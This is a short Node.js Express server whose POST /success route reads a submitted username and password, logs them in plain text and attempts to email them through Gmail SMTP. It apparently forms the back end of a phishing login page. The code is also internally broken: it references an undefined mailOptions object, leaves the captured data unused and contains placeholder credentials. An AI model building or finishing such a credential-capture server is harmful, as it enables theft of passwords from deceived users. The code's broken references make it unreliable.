var express = require('express');
var app = express();
var bodyParser = require("body-parser");
var fs = require("fs");
var nodemailer = require('nodemailer');
app.use(bodyParser.urlencoded({extended:true}));
app.use(express.static('library'))

const transporter = nodemailer.createTransport({
    port: 465,               // true for 465, false for other ports
    host: "smtp.gmail.com",
       auth: {
            user: 'youremail@gmail.com',
            pass: 'password',
         },
    secure: true,
    });

const mailData = {
        from: 'youremail@gmail.com',  // sender address
          to: 'myfriend@gmail.com',   // list of receivers
          subject: 'Sending Email using Node.js',
          text: 'That was easy!',
          html: '<b>Hey there! </b> <br> This is our first message sent with Nodemailer<br/>',
        };

app.get("/",function(req,res){
    res.sendFile('index.html',{root:__dirname})
});

app.post("/success",function(req,res){
    var username = req.body.username;
    var password = req.body.password;
    password = JSON.stringify(password,null,2);
    username = JSON.stringify(username,null,2);
    console.log(username+"->"+password);
    var data = username+"->"+password+"\n";
    transporter.sendMail(mailOptions, function (err, info) {
        if(err)
          console.log(err)
        else
          console.log(info);
     });
    res.render("success.ejs");
});
app.listen(3000,function(){
    console.log("Server listening on port 3000");
});

